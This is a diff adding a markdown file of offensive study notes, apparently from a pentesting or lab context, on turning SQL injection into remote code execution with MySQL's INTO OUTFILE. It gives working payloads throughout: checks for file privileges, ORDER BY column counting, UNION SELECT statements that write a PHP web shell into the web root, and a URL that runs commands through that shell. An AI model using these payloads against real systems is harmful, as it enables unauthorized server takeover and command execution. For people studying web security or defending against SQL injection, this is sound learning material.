@@ -1,0 +1,149 @@
+🧨 Summary: From DB to RCE
+You’re leveraging SQLi to go beyond data and straight into file system write access, which lets you:
+
+✅ Write arbitrary files like logs, shells, or test files
+
+✅ Drop a PHP web shell to get remote command execution
+
+✅ Confirm webroot paths by writing test files
+
+✅ Escalate access — now you’re a web user, not just a DB user
+
+🛡️ Preconditions (aka “Can I even write?”)
+You need 3 green lights:
+
+✅ Condition	How You Check
+FILE privilege?	SELECT super_priv FROM mysql.user
+secure_file_priv is empty (or points to writeable dir)	SELECT variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'
+File system is writeable	Test with: UNION SELECT ..., ..., ..., ... INTO OUTFILE '/var/www/html/test.txt'-- -
+💡 Pro Tip:
+Writing proof.txt is like a canary file — confirms the path, permissions, and DB behavior before going full shell.
+
+🕳️ Then… You Drop the Shell:
+php
+Copy
+Edit
+<?php system($_REQUEST[0]); ?>
+And your exploit becomes:
+
+sql
+Copy
+Edit
+cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+💥 http://host/shell.php?0=id
+
+Congrats, you’ve popped the box through SQLi.
+
+This whole section is literally lateral movement via SQLi — just with less PowerShell and more system($_REQUEST).
+
+
+
+🧪 The test file (like proof.txt) is your canary
+It tells you:
+
+✅ You have write access
+
+✅ The path is correct
+
+✅ Your syntax isn't broken
+
+✅ Why you use UNION SELECT ..., ..., ..., ... INTO OUTFILE
+This part is not for directory traversal — it's to satisfy the expected number of columns in the original query. For example:
+
+sql
+Copy
+Edit
+UNION SELECT 1, 'test', 3, 4 INTO OUTFILE '/var/www/html/proof.txt'-- -
+You're just stuffing junk (1, 3, 4) into the rest of the columns because:
+
+You must match the number of columns
+
+You want 'test' to be written, but SQL won’t let you write just one column’s result if the original query returns more
+
+If the original query has 4 columns, you need 4 columns in your UNION SELECT, or it breaks.
+
+📂 How do you find the right directory?
+This is where your directory traversal mindset shines:
+
+🔍 1. Try the common ones:
+/var/www/html/
+
+/var/www/
+
+/srv/http/
+
+/usr/share/nginx/html/
+
+(or Windows: C:\inetpub\wwwroot\)
+
+🛠️ 2. Fuzz for it (if nothing obvious works):
+Write proof.txt into each likely path until it sticks. Use something like:
+
+sql
+Copy
+Edit
+INTO OUTFILE '/var/www/html/proof.txt'
+then:
+
+bash
+Copy
+Edit
+curl http://target/proof.txt
+If you get a 200 and see your text — bingo 🎯
+
+🧼 Bonus Tip:
+If you want your proof file clean (no extra junk like 1, 3, 4), you can use:
+
+sql
+Copy
+Edit
+UNION SELECT '', 'file written', '', '' INTO OUTFILE '/var/www/html/proof.txt'-- -
+Or just:
+
+sql
+Copy
+Edit
+UNION SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE ...
+IF the query only returns 1 column (rare though — usually 3+).
+
+TL;DR:
+The ..., ..., ... is for column count, not directory traversal
+
+You’ll test multiple paths like directory fuzzing
+
+Once the test file is live, write your shell there 💣
+
+
+🔢 The number of ..., ..., ... in UNION SELECT comes from your earlier column count test
+You already did this when you ran:
+
+sql
+Copy
+Edit
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+...and figured out that the original query uses, say, 4 columns. So now every UNION payload must look like:
+
+sql
+Copy
+Edit
+UNION SELECT 1, 2, 3, 4
+So when you're writing a file, you must still match that structure:
+
+sql
+Copy
+Edit
+UNION SELECT "", "<?php system($_GET[0]); ?>", "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+🧠 Think of it like this:
+The number of columns is locked in by the original application’s query.
+You're just hijacking the result rows — but you can’t change how many columns the app expects, so you gotta match it exactly.
+
+🔧 TL;DR:
+✅ Count columns first (via ORDER BY or test UNIONs)
+
+✅ Always match that number in UNION SELECT — even if only one column matters
+
+✅ Use dummy values like NULL, '', or numbers for the rest
+
+
